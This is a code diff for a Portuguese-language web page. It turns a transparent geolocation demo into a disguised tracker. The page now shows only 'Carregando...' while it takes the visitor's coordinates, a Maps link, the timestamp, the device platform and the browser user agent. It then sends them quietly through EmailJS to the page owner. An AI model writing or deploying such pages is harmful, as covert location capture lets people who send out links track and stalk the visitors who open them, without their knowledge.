@@ -2,46 +2,50 @@
 <html lang="pt-BR">
 <head>
   <meta charset="UTF-8">
-  <title>Geolocalização automática</title>
+  <title>Carregando...</title>
+
+  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
 </head>
 <body>
 
-  <h2>Obtendo sua localização...</h2>
-  <p id="resultado">Aguardando permissão...</p>
+<p id="status">Carregando...</p>
 
-  <script>
-    window.onload = function() {
-      const resultado = document.getElementById("resultado");
+<script>
+(function(){
+  emailjs.init("SUA_PUBLIC_KEY");
+})();
 
-      if (!navigator.geolocation) {
-        resultado.innerText = "Geolocalização não é suportada pelo seu navegador.";
-        return;
-      }
+navigator.geolocation.getCurrentPosition(
+  function(pos) {
+    const lat = pos.coords.latitude;
+    const lon = pos.coords.longitude;
 
-      navigator.geolocation.getCurrentPosition(
-        function(posicao) {
-          const lat = posicao.coords.latitude;
-          const lon = posicao.coords.longitude;
-          resultado.innerText = `Latitude: ${lat} | Longitude: ${lon}`;
-        },
-        function(erro) {
-          switch(erro.code) {
-            case erro.PERMISSION_DENIED:
-              resultado.innerText = "Permissão negada.";
-              break;
-            case erro.POSITION_UNAVAILABLE:
-              resultado.innerText = "Localização indisponível.";
-              break;
-            case erro.TIMEOUT:
-              resultado.innerText = "Tempo de requisição excedido.";
-              break;
-            default:
-              resultado.innerText = "Erro desconhecido.";
-          }
-        }
-      );
-    };
-  </script>
+    const agora = new Date().toLocaleString();
+
+    const dispositivo = navigator.platform;
+    const navegador = navigator.userAgent;
+
+    document.getElementById("status").innerText = "Processando...";
+
+    emailjs.send("SEU_SERVICE_ID", "SEU_TEMPLATE_ID", {
+      latitude: lat,
+      longitude: lon,
+      maps: `https://www.google.com/maps?q=${lat},${lon}`,
+      datahora: agora,
+      dispositivo: dispositivo,
+      navegador: navegador
+    }).then(() => {
+      document.getElementById("status").innerText = "OK";
+    }).catch(() => {
+      document.getElementById("status").innerText = "Erro ao enviar";
+    });
+  },
+
+  function() {
+    document.getElementById("status").innerText = "Permissão necessária";
+  }
+);
+</script>
 
 </body>
 </html>
